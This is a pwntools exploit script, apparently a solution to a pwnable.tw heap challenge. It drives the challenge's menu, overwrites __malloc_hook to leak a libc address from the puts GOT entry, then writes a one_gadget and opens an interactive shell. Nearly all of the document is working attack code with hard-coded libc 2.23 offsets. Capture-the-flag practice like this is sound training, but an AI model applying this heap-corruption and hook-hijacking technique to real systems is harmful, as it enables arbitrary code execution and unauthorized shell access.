###Found the bug by fuzzing
###Have not yet analyzed how the allocate buf pointer is hijacked (seems to have something to do with malloc fallback func)

from pwn import *

###Utils
def alloc(size,name):
    r.sendlineafter('choice:','1')
    r.sendlineafter('Size :',str(size))
    r.sendlineafter('allocator ?',name)

def malloc(size,name):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Size :',str(size))
    r.sendlineafter('allocator ?',name)

def edit(data):
    r.sendlineafter('choice:','3')
    r.sendafter('Content :',data)

def create():
    r.sendlineafter('choice:','4')

def delete():
    r.sendlineafter('choice:','5')

def leave():
    r.sendlineafter('choice:','6')

def trigger_malloc_hook(target,callback=None):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Size :',str(target))
    if callback is not None:
        return callback()

###Addr
#  libc2.23
puts_got = 0x603f40
puts_leave_stub = 0x401498
puts_offset = 0x6f690
stdin_struct_offset = 0x3c38e0
malloc_hook_offset = 0x3c3b10
one_gadget = 0x4526a

###Exploit
r = remote('chall.pwnable.tw',10404)

create()

for i in range(3):
    alloc(0xfff,'M30W')
    create()
alloc(0xd30,'M30W')
create()
alloc(0x790,'M30W')
for i in range(9):
    create()
alloc(0xfff,'M30W')
edit((b'a'*0x50).ljust(malloc_hook_offset-(stdin_struct_offset+0x90),b'\x00')+p64(puts_leave_stub))

create()
puts_addr = u64(trigger_malloc_hook(puts_got,r.recvline)[:-1]+b'\x00\x00')
libc_base = puts_addr-puts_offset
print(hex(libc_base))

edit((b'a'*0x50).ljust(malloc_hook_offset-(stdin_struct_offset+0x90),b'\x00')+p64(libc_base+one_gadget))
create()
trigger_malloc_hook(0x100)
r.interactive()
